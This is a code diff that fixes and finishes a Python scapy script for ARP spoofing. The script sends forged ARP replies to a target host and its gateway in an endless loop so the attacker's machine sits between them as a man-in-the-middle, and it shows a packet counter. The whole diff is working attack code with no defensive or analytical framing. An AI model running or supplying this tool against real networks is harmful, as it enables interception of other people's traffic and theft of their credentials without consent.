@@ -1,6 +1,7 @@
 from scapy.layers.l2 import ARP, Ether, srp, send
 from termcolor import cprint
 import argparse
+import time
 
 class NoTargetSpecified(Exception):
     pass
@@ -12,22 +13,22 @@ class NoGatewaySpecified(Exception):
 def get_MAC(ip):
     arp_header = ARP(pdst=ip)
     eth_header = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = eth_header/ARP
+    packet = eth_header/arp_header
 
     response_list = srp(packet, timeout=1, verbose=False)[0]
 
     return response_list[0][1].hwsrc
 
 #Use ARP response to update MAC address of spoof_ip on victim_IP ARP table 
-def spoof(victim_ip, spoof_ip):
-    victim_MAC = get_MAC(gateway_ip)
-    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_MAC, psrc=fiction_ip)
-    send(packet)
+def spoof(victim_IP, spoof_IP):
+    victim_MAC = get_MAC(victim_IP)
+    packet = ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=spoof_IP)
+    send(packet, verbose=False)
 
 
 #Evaluate if IP_address is valid
 def check_format_IP(IP_address):
-    IP_numbers = params[0].split('.')
+    IP_numbers = IP_address.split('.')
     
     if len(IP_numbers)!=4:
         raise NoNetworkSpecified
@@ -36,7 +37,7 @@ def check_format_IP(IP_address):
             if(int(num)>255 or int(num)<0):
                 raise NoNetworkSpecified
 
-    return network
+    return IP_address
 
 
 #Parser of command line arguments
@@ -58,10 +59,10 @@ def args_parser():
             raise NoGatewaySpecified
         
         target_IP=check_format_IP(args.target)
-        cprint('Target  address:   ', 'yellow', attrs=['bold',], end='')
-        print(f'{target}', end='\n\n')
+        cprint('\nTarget  address:   ', 'yellow', attrs=['bold',], end='')
+        print(f'{target_IP}')
         gateway_IP=check_format_IP(args.gateway)
-        cprint('Gateway  address:  ', 'yellow', attrs=['bold',], end='')
+        cprint('Gateway  address:  ', 'green', attrs=['bold',], end='')
         print(f'{gateway_IP}', end='\n\n')
 
     except (NoTargetSpecified, NoGatewaySpecified) as e :
@@ -75,16 +76,24 @@ def args_parser():
 def main():
     #To establish MIDM connection, we need to repeat the update of ARP 
     #table for victim and gateway otherwise it is automatic reset
-    while True:
-        target_ip, gateway_ip = args_parser()
-        #Send ARP response to target_IP so my PC pretends to be the gateway
-        #sending my MAC as Ethernet Address of packet 
-        spoof(target_IP, gateway_IP)
-        #Send ARP response to gateway_IP so my PC pretends to be the target
-        #sending my MAC as Ethernet Address of packet
-        spoof(gateway_IP, target_IP)
+    target_IP, gateway_IP = args_parser()
+    num_pkts = 0
 
-
+    try:
+        while True:
+            #Send ARP response to target_IP so my PC pretends to be the gateway
+            #sending my MAC as Ethernet Address of packet 
+            spoof(target_IP, gateway_IP)
+            #Send ARP response to gateway_IP so my PC pretends to be the target
+            #sending my MAC as Ethernet Address of packet
+            spoof(gateway_IP, target_IP)
+            num_pkts += 2
+            print('\rPackets sent: ', end='')
+            cprint('{:>5}'.format(num_pkts), 'blue', attrs=['bold',], end='')
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n\n[Detected CTRL+C] Closing the program...", end='\n\n')
+        exit(0)
 
 if __name__=="__main__":
     main()
